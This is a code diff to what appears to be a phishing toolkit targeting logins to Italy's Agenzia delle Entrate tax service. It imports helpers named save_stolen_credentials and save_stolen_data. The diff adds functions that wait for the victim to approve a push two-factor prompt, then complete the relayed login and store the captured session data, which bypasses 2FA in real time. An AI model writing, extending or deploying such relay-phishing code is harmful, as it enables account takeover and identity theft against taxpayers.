@@ -1,4 +1,4 @@
-from .client import execute_access_flow, access_again_login_page, post_credentials, get_qr_code_status, submit_scanned_qr_code, confirm_access
+from .client import execute_access_flow, access_again_login_page, post_credentials, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access
 from .parser import extract_qr_code, extract_login_errors
 from ..flow import LoginFlow
 from ..utils.writer import save_stolen_credentials, save_stolen_data
@@ -36,6 +36,17 @@ def submit_credentials(login_flow: LoginFlow, credentials: dict) -> dict | None:
     error = extract_login_errors(login_flow.response.text)
 
     return error
+
+def check_2fa(login_flow: LoginFlow) -> dict:
+    """Checks if the 2FA has been confirmed and returns the result"""
+    get_2fa_status(login_flow)
+    return login_flow.response.json()
+
+def retrieve_access_after_push_2fa(login_flow: LoginFlow) -> None:
+    """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the 2FA has been confirmed"""
+    submit_push_2fa(login_flow)
+    confirm_access(login_flow)
+    save_stolen_data(login_flow)
 
 def check_qr_code(login_flow: LoginFlow) -> dict:
     """Checks if the QR code has been scanned and returns the result"""
